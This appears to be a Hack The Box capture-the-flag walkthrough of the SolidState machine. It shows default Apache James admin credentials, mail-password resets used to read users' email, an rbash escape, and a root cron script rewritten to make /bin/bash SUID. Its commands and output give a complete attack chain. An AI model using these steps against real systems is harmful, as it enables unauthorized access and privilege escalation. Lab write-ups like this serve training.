---
layout: single
title: SolidState - Hack The Box
excerpt: "SolidState is a quick and fun medium box where we're going to exploit a vulnerability of the service Apache James after that we're goint to change the credentials of many users of the machine to see through an email from a user of the machine we found credentials to be able to connect via ssh and to be root we have to abuse cron jobs."
date: 2023-01-26
classes: wide
toc: true
toc_label: "Contenido"
toc_icon: "fire"
header:
  teaser: /assets/images/htb-writeup-solidstate/new.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - infosec
tags:  
  - Apache James Server
  - Cron Job
---

<p align="center">
<img src="/assets/images/htb-writeup-solidstate/logo.png">
</p>

SolidState is a quick and fun medium box where we're going to exploit a vulnerability of the service Apache James after that we're goint to change the credentials of many users of the machine to see through an email from a user of the machine we found credentials to be able to connect via ssh and to be root we have to abuse cron jobs

## PortScan

```bash
❯ nmap -sCV -p22,25,80,110,119,4555 10.10.10.51 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-25 13:34 CST
Stats: 0:01:32 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 83.33% done; ETC: 13:36 (0:00:18 remaining)
Nmap scan report for 10.10.10.51
Host is up (0.14s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 77:00:84:f5:78:b9:c7:d3:54:cf:71:2e:0d:52:6d:8b (RSA)
|   256 78:b8:3a:f6:60:19:06:91:f5:53:92:1d:3f:48:ed:53 (ECDSA)
|_  256 e4:45:e9:ed:07:4d:73:69:43:5a:12:70:9d:c4:af:76 (ED25519)
25/tcp   open  smtp    JAMES smtpd 2.3.2
|_smtp-commands: solidstate Hello nmap.scanme.org (10.10.14.9 [10.10.14.9])
80/tcp   open  http    Apache httpd 2.4.25 ((Debian))
|_http-title: Home - Solid State Security
|_http-server-header: Apache/2.4.25 (Debian)
110/tcp  open  pop3    JAMES pop3d 2.3.2
119/tcp  open  nntp    JAMES nntpd (posting ok)
4555/tcp open  rsip?
| fingerprint-strings: 
|   GenericLines: 
|     JAMES Remote Administration Tool 2.3.2
|     Please enter your login and password
|     Login id:
|     Password:
|     Login failed for 
|_    Login id:
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port4555-TCP:V=7.92%I=7%D=1/25%Time=63D18455%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,7C,"JAMES\x20Remote\x20Administration\x20Tool\x202\.3\.2\nPl
SF:ease\x20enter\x20your\x20login\x20and\x20password\nLogin\x20id:\nPasswo
SF:rd:\nLogin\x20failed\x20for\x20\nLogin\x20id:\n");
Service Info: Host: solidstate; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

The port 4555 have a login but we need credentials  

```bash
❯ nc 10.10.10.51 4555
JAMES Remote Administration Tool 2.3.2
Please enter your login and password
Login id:
```

I found credentials

- [https://vk9-sec.com/apache-james-server-2-3-2-cve-2015-7611/#:~:text=By%20default%2C%20the%20Apache%20James,with%20the%20%22adduser%22%20command.](https://vk9-sec.com/apache-james-server-2-3-2-cve-2015-7611/#:~:text=By%20default%2C%20the%20Apache%20James,with%20the%20%22adduser%22%20command.)

Default credentials

```bash
root:root
```

After that we can connect and see the users 

```bash
listusers
Existing accounts 5
user: james
user: thomas
user: john
user: mindy
user: mailadmin
```

So if we see the webpage of the link  we can change the credentials of the users because we're root 

```bash
setpassword james james123
Password for james reset
```

We can try with the user james

```bash
❯ telnet 10.10.10.51 110
Trying 10.10.10.51...
Connected to 10.10.10.51.
Escape character is '^]'.
+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready 
USER james
+OK
PASS james123
+OK Welcome james
```

But we don't have nothing

```bash
HELP
-ERR
?
-ERR
LIST 
+OK 0 0
.
```

Now change the password of thomas but nothing too 

```bash
❯ telnet 10.10.10.51 110
Trying 10.10.10.51...
Connected to 10.10.10.51.
Escape character is '^]'.
+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready 
USER Thomas
+OK
PASS thomas123
-ERR Authentication failed.
USER thomas
+OK
PASS thomas123
+OK Welcome thomas
LIST
+OK 0 0
.
```

Now change the password of john 

```bash
❯ telnet 10.10.10.51 110
Trying 10.10.10.51...
Connected to 10.10.10.51.
Escape character is '^]'.
+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready 
USER john
+OK
PASS john123
+OK Welcome john
LIST
+OK 1 743
1 743
.
LIST 1
+OK 1 743
RETER 1
-ERR
RETR 1
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <9564574.1.1503422198108.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: john@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581
          for <john@localhost>;
          Tue, 22 Aug 2017 13:16:20 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:16:20 -0400 (EDT)
From: mailadmin@localhost
Subject: New Hires access
John, 

Can you please restrict mindy's access until she gets read on to the program. Also make sure that you send her a tempory password to login to her accounts.

Thank you in advance.

Respectfully,
James
.
```

John have information and said mindy have tempory password to login to her accounts

Change the password of mindy

```bash
❯ telnet 10.10.10.51 110
Trying 10.10.10.51...
Connected to 10.10.10.51.
Escape character is '^]'.
+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready 
USER mindy
+OK
PASS mindy123
+OK Welcome mindy
LIST
+OK 2 1945
1 1109
2 836
.
RETR 1
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <5420213.0.1503422039826.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: mindy@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 798
          for <mindy@localhost>;
          Tue, 22 Aug 2017 13:13:42 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:13:42 -0400 (EDT)
From: mailadmin@localhost
Subject: Welcome

Dear Mindy,
Welcome to Solid State Security Cyber team! We are delighted you are joining us as a junior defense analyst. Your role is critical in fulfilling the mission of our orginzation. The enclosed information is designed to serve as an introduction to Cyber Security and provide resources that will help you make a smooth transition into your new role. The Cyber team is here to support your transition so, please know that you can call on any of us to assist you.

We are looking forward to you joining our team and your success at Solid State Security. 

Respectfully,
James
.
RETR 2
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <16744123.2.1503422270399.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: mindy@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581
          for <mindy@localhost>;
          Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
From: mailadmin@localhost
Subject: Your Access

Dear Mindy,


Here are your ssh credentials to access the system. Remember to reset your password after your first login. 
Your access is restricted at the moment, feel free to ask your supervisor to add any commands you need to your path. 

username: mindy
pass: P@55W0rd1!2@

Respectfully,
James

.
```

We have the credentials of mindy

```bash
mindy:P@55W0rd1!2@
```

Now we connect via ssh

```bash
❯ ssh mindy@10.10.10.51
The authenticity of host '10.10.10.51 (10.10.10.51)' can't be established.
ECDSA key fingerprint is SHA256:njQxYC21MJdcSfcgKOpfTedDAXx50SYVGPCfChsGwI0.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.51' (ECDSA) to the list of known hosts.
mindy@10.10.10.51's password: 
Linux solidstate 4.9.0-3-686-pae #1 SMP Debian 4.9.30-2+deb9u3 (2017-08-06) i686

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Aug 22 14:00:02 2017 from 192.168.11.142
mindy@solidstate:~$ 
```

## User flag

```bash
mindy@solidstate:~$ clear
-rbash: clear: command not found
mindy@solidstate:~$ echo $PATH
/home/mindy/bin
mindy@solidstate:~$ pwd
/home/mindy
mindy@solidstate:~$ ls
bin  user.txt
mindy@solidstate:~$ cat user.txt 
6a0424ed1865c1e5efb7f0f2af9b95f8
mindy@solidstate:~$
mindy@solidstate:~$ ls bin/
cat  env  ls
mindy@solidstate:~$
```

We have problems is a rbash 

We want a bash so we can do this

```bash
❯ sshpass -p 'P@55W0rd1!2@' ssh mindy@10.10.10.51 whoami
mindy
```

```bash
❯ sshpass -p 'P@55W0rd1!2@' ssh mindy@10.10.10.51 bash
whoami
mindy
pwd
/home/mindy
```

That works 

```bash
❯ ssh mindy@10.10.10.51 bash
mindy@10.10.10.51's password: P@55W0rd1!2@
whaomi
bash: line 1: whaomi: command not found
whoami
mindy
script /dev/null -c bash
Script started, file is /dev/null
${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ 
CTRL+Z
stty raw -echo; fg
reset xterm
```

Now we have a bash

```bash
${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ export SHELL=/bin/bash
${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ echo $SHELL
/bin/bash 
${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ export TERM=xterm
${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ echo $TERM
xterm
```

## Privilege escalation

```bash
${debian_chroot:+($debian_chroot)}mindy@solidstate:/$ find \-perm -4000 2>/dev/null
./bin/su
./bin/mount
./bin/fusermount
./bin/ping
./bin/ntfs-3g
./bin/umount
./usr/bin/newgrp
./usr/bin/pkexec
./usr/bin/passwd
./usr/bin/chsh
./usr/bin/chfn
./usr/bin/gpasswd
./usr/sbin/pppd
./usr/lib/policykit-1/polkit-agent-helper-1
./usr/lib/openssh/ssh-keysign
./usr/lib/eject/dmcrypt-get-device
./usr/lib/dbus-1.0/dbus-daemon-launch-helper
./usr/lib/xorg/Xorg.wrap
./usr/lib/spice-gtk/spice-client-glib-usb-acl-helper
${debian_chroot:+($debian_chroot)}mindy@solidstate:/$ 
```

You can abuse of the pkexec binary but it's not the idea

Export your path 

```bash
export PATH=yourpath
```

And nothing of interest

```bash
${debian_chroot:+($debian_chroot)}mindy@solidstate:/$ getcap -r / 2>/dev/null
/usr/bin/arping = cap_net_raw+ep
/usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep
/usr/lib/i386-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
${debian_chroot:+($debian_chroot)}mindy@solidstate:/$ 
```

Now we can see cron jobs you can use pspy or a bash script 

- [Pspy](https://github.com/DominicBreuker/pspy)

```bash
${debian_chroot:+($debian_chroot)}mindy@solidstate:/dev/shm$ touch procmon.sh
${debian_chroot:+($debian_chroot)}mindy@solidstate:/dev/shm$ ls
procmon.sh
${debian_chroot:+($debian_chroot)}mindy@solidstate:/dev/shm$ chmod +x procmon.sh 
```

```bash
${debian_chroot:+($debian_chroot)}mindy@solidstate:/dev/shm$ cat procmon.sh 
#!/bin/bash

function ctrl_c(){
	echo -e "\n\n[!] Exit...\n"
	tput cnorm; exit 1
}

# Ctrl+C
trap ctrl_c INT

tput civis

old_process="$(ps -eo command)"

while true; do
	new_process="$(ps -eo command)"
	diff <(echo "$old_process") <(echo "new_process") | grep "[\>\<]" | grep -vE "command|procmon|kworker"
	old_process=$new_process
done
${debian_chroot:+($debian_chroot)}mindy@solidstate:/dev/shm$ 
```

The most interesting thing the script reported is this

```bash
${debian_chroot:+($debian_chroot)}mindy@solidstate:/dev/shm$ ls -l /opt/tmp.py 
-rwxrwxrwx 1 root root 105 Aug 22  2017 /opt/tmp.py
${debian_chroot:+($debian_chroot)}mindy@solidstate:/dev/shm$
```

If you use pspy you have to see that

```bash
2023/01/26 19:27:01 CMD: UID=0     PID=22630  | /bin/sh -c python /opt/tmp.py 
2023/01/26 19:27:01 CMD: UID=0     PID=22631  | 
2023/01/26 19:27:01 CMD: UID=0     PID=22632  | sh -c rm -r /tmp/*  
2023/01/26 19:27:01 CMD: UID=0     PID=22633  | sh -c rm -r /tmp/*
```

Root run the script 

```bash
${debian_chroot:+($debian_chroot)}mindy@solidstate:/dev/shm$ cat /opt/tmp.py 
#!/usr/bin/env python
import os
import sys
try:
     os.system('rm -r /tmp/* ')
except:
     sys.exit()

${debian_chroot:+($debian_chroot)}mindy@solidstate:/dev/shm$ 

```

The os.system library is imported and is run by root so we can alter that because we have permissions to write the script

```bash
${debian_chroot:+($debian_chroot)}mindy@solidstate:/dev/shm$ cat /opt/tmp.py 
#!/usr/bin/env python
import os
import sys
try:
     os.system('chmod u+s /bin/bash')
except:
     sys.exit()

${debian_chroot:+($debian_chroot)}mindy@solidstate:/dev/shm$ ls -l /bin/bash
-rwxr-xr-x 1 root root 1265272 May 15  2017 /bin/bash
${debian_chroot:+($debian_chroot)}mindy@solidstate:/dev/shm$
```


Now we have to wait the bash to be suid

```bash
${debian_chroot:+($debian_chroot)}mindy@solidstate:/dev/shm$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1265272 May 15  2017 /bin/bash
${debian_chroot:+($debian_chroot)}mindy@solidstate:/dev/shm$
```

## Root flag

```bash
${debian_chroot:+($debian_chroot)}mindy@solidstate:/dev/shm$ bash -p
bash-4.4# whoami
root
bash-4.4# cat /root/root.txt
6b4d6ee5878e644dd73e7484a8c68b69
```













































































